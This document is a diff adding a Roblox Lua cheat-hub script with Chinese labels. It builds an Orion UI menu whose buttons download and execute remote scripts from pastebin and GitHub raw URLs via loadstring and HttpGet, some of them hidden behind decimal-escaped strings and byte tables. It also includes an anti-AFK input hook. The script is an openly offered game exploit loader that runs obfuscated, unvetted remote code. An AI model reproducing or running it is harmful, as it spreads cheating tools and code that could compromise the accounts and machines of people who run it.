@@ -1,0 +1,167 @@
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title = "Sn",
+    Text = "Permission = true",
+    Icon = "rbxassetid://17240832325",
+    Duration = 60,
+    Callback = bindable,
+    Button1 = "invalid",
+    Button2 = "Effective opening"
+})
+
+local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/VeaMSRZK"))()
+local LBLG = Instance.new("ScreenGui", getParent)
+local LBL = Instance.new("TextLabel", getParent)
+local player = game.Players.LocalPlayer
+
+LBLG.Name = "LBLG"
+LBLG.Parent = game.CoreGui
+LBLG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LBLG.Enabled = true
+LBL.Name = "LBL"
+LBL.Parent = LBLG
+LBL.BackgroundColor3 = Color3.new(1, 1, 1)
+LBL.BackgroundTransparency = 1
+LBL.BorderColor3 = Color3.new(0, 0, 0)
+LBL.Position = UDim2.new(0.75,0,0.010,0)
+LBL.Size = UDim2.new(0, 133, 0, 30)
+LBL.Font = Enum.Font.GothamSemibold
+LBL.Text = "标志"
+LBL.TextColor3 = Color3.new(155, 155, 155)
+LBL.TextScaled = true
+LBL.TextSize = 14
+LBL.TextWrapped = true
+LBL.Visible = true
+
+local FpsLabel = LBL
+local Heartbeat = game:GetService("RunService").Heartbeat
+local LastIteration, Start
+local FrameUpdateTable = { }
+
+local function HeartbeatUpdate()
+	LastIteration = tick()
+	for Index = #FrameUpdateTable, 1, -1 do
+		FrameUpdateTable[Index + 1] = (FrameUpdateTable[Index] >= LastIteration - 1) and FrameUpdateTable[Index] or nil
+	end
+	FrameUpdateTable[1] = LastIteration
+	local CurrentFPS = (tick() - Start >= 1 and #FrameUpdateTable) or (#FrameUpdateTable / (tick() - Start))
+	CurrentFPS = CurrentFPS - CurrentFPS % 1
+	FpsLabel.Text = ("二战时间:"..os.date("%H").."时"..os.date("%M").."分"..os.date("%S"))
+end
+
+OrionLib:MakeNotification({
+                    Name = "正在开启反外挂请稍等...",
+                    Content = "Akf 开启中...",
+                    Time = 2
+                })     
+print("你好FLUXUS")
+		local vu = game:GetService("VirtualUser")
+		game:GetService("Players").LocalPlayer.Idled:connect(function()
+		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		   wait(1)
+		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+		end)      
+
+OrionLib:MakeNotification({
+                    Name = "死m成功",
+                    Content = "AKF",
+                    Time = 1
+                })
+    wait(1)
+Start = tick()
+Heartbeat:Connect(HeartbeatUpdate)
+local Window = OrionLib:MakeWindow({Name = "天使中心", HidePremium = false, SaveConfig =true,IntroText="😇😇😇", ConfigFolder = "水泥中心"})
+local Tab = Window:MakeTab({
+	Name = "通用",
+	Icon = "rbxassetid://7733779610",
+	PremiumOnly = false
+})
+
+Tab:AddButton ({
+	Name = "飞行",
+	Callback = function ()
+	 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
+	end
+})
+Tab:AddButton ({
+	Name = "IY",
+	Callback = function ()
+	 loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,87,97,110,103,122,104,101,104,97,111,104,47,102,108,121,45,97,119,97,121,47,109,97,105,110,47,37,69,54,37,56,67,37,56,55,37,69,52,37,66,66,37,56,65,37,69,52,37,66,56,37,65,68,37,69,54,37,57,54,37,56,55,46,116,120,116})end)())))()
+	end
+})
+Tab:AddButton ({
+	Name = "SA脚本有工具",
+	Callback = function ()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"))()
+	end
+})
+local Tab = Window:MakeTab({
+	Name = "脚本中心大全",
+	Icon = "rbxassetid://7733779610",
+	PremiumOnly = false
+})
+Tab:AddButton ({
+	Name = "XK",
+	Callback = function ()
+	 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\73\78\106\105\97\111\98\122\120\54\47\66\73\78\106\105\97\111\47\109\97\105\110\47\88\75\46\84\88\84\34\41\41\40\41\10")()
+	end
+})
+Tab:AddButton ({
+	Name = "皮",
+	Callback = function ()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
+	end
+})
+Tab:AddButton ({
+	Name = "皇",
+	Callback = function ()
+	 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
+	end
+})
+Tab:AddButton ({
+	Name = "nn中心",
+	Callback = function ()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/nnzhonhxin/nnzhongxin/main/Protected_6411220576316775.txt"))()
+	end
+})
+Tab:AddButton ({
+	Name = "情风",
+	Callback = function ()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/dzq1311056/wet/refs/heads/main/Protected_1899750687398305.txt"))()
+	end
+})
+Tab:AddButton ({
+	Name = "禁漫中心",
+	Callback = function ()
+	 getgenv().lishichuan="禁漫中心1001390385" loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/main/jmjmjmjmjmjmjmjmjmjmjmjmjmjmjmjm.lua"))()
+	end
+})
+Tab:AddButton ({
+	Name = "ms",
+	Callback = function ()
+	 getgenv().Spy="mspaint" loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoXuAnZang/XKscript/refs/heads/main/DOORS.txt"))()
+	end
+})
+Tab:AddButton ({
+	Name = "作者：😇快手名：😇",
+	Callback = function ()
+	 loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
+	end
+})
+Tab:AddButton ({
+	Name = "陈脚本",
+	Callback = function ()
+	 getgenv().Cheng = "陈脚本群号687245204"loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\81\120\68\68\57\83\112\87\34\41\41\40\41")()
+	end
+})
+Tab:AddButton ({
+	Name = "RNG",
+	Callback = function ()
+	 loadstring(game:HttpGet("https://raw.githubusercontent.com/jfjfjfjvg/nonono-/refs/heads/main/Protected_4836001864217254.txt"))("RNG")
+	end
+})
+Tab:AddButton ({
+	Name = "快手号：zzmm12399",
+	Callback = function ()
+	 getgenv().lishichuan="禁漫中心1001390385" loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/anlushanjinchangantangwanle/main/jmjmjmjmjmjmjmjmjmjmjmjmjmjmjmjm.lua"))()
+	end
+})
